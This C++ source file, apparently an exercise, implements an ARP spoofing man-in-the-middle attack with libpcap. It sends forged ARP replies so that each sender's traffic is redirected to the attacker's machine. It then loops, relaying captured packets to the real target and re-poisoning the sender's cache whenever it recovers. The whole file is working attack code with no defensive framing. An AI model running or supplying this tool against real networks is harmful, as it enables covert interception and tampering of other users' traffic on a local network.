#include <pcap.h>
#include <stdio.h>
#include "arp_spoof.h"

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: pcap_test wlan0\n");
}

int main(int argc, char* argv[]) {



    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    int address_set_count = (argc-2)/2;

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    uint8_t attacker_ip[4];
    uint8_t attacker_mac[6];

    struct address_set *address_set = new struct address_set[address_set_count];

    get_ip_address (dev, (u_char*)attacker_ip);
    get_mac_address(dev, attacker_mac);

    for(int i = 0; i < address_set_count; i++)
    {
        str_ip2int_ip(argv[2+(i*2)], address_set[i].sender_ip);
        str_ip2int_ip(argv[3+(i*2)], address_set[i].target_ip);
    }


    for(int i = 0; i < address_set_count; i++)
    {
        make_arp_request_packet_get_mac(attacker_mac, attacker_ip, address_set[i].sender_ip, address_set[i].request_packet_to_sender);
        make_arp_request_packet_get_mac(attacker_mac, attacker_ip, address_set[i].target_ip, address_set[i].request_packet_to_target);

    }


    pcap_t* handle = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    for(int i = 0; i < address_set_count; i++)
    {
        send_request_packet_for_get_mac(handle, dev, &address_set[i] , SEND_REQUEST_MESSAGE_TO_GET_SENDER_MAC);
        send_request_packet_for_get_mac(handle, dev, &address_set[i] , SEND_REQUEST_MESSAGE_TO_GET_TARGET_MAC);

    }

    for(int i = 0; i < address_set_count; i++)
    {
        make_arp_reply_spoofed_packet_for_attack(attacker_mac, address_set[i].target_ip, address_set[i].sender_mac, address_set[i].sender_ip, address_set[i].spoofed_reply_packet_to_sender);
        pcap_sendpacket(handle, address_set[i].spoofed_reply_packet_to_sender, 42);

    }
    /*
    for(int i = 0; i < address_set_count; i++)
    {
        printf("sender ip[%d] : %d.%d.%d.%d\n", i, address_set[i].sender_ip[0], address_set[i].sender_ip[1], address_set[i].sender_ip[2], address_set[i].sender_ip[3]);
        printf("target ip[%d] : %d.%d.%d.%d\n", i , address_set[i].target_ip[0], address_set[i].target_ip[1], address_set[i].target_ip[2], address_set[i].target_ip[3]);
        printf("sender mac[%d] : %02x.%02x.%02x.%02x.%02x:%02x\n", i, address_set[i].sender_mac[0], address_set[i].sender_mac[1], address_set[i].sender_mac[2], address_set[i].sender_mac[3], address_set[i].sender_mac[4], address_set[i].sender_mac[5]);
        printf("target mac[%d] : %02x.%02x.%02x.%02x.%02x:%02x\n", i, address_set[i].target_mac[0], address_set[i].target_mac[1], address_set[i].target_mac[2], address_set[i].target_mac[3], address_set[i].target_mac[4], address_set[i].target_mac[5]);
    }
    */

    printf("spoof success\n");
    while(1)
    {
        struct pcap_pkthdr* header;
        const u_char* captured_packet;

        int res = pcap_next_ex(handle, &header, &captured_packet);
        if (res == 0){printf("res == 0\n");continue;}
        if (res == -1 || res == -2) {printf("res == -1 || res == -2");break;}


        for(int i = 0; i < address_set_count; i++)
        {
            int ret = monitoring_packet(address_set[i].sender_mac, attacker_mac, address_set[i].target_mac, captured_packet);
            if(ret == 1)
            {
                pcap_relaypacket(handle, attacker_mac, address_set[i].target_mac, captured_packet);
            }
            if(ret == 2)
            {
                pcap_sendpacket(handle, address_set[i].spoofed_reply_packet_to_sender, 42);
            }
        }

    }


    pcap_close(handle);
    return 0;
}

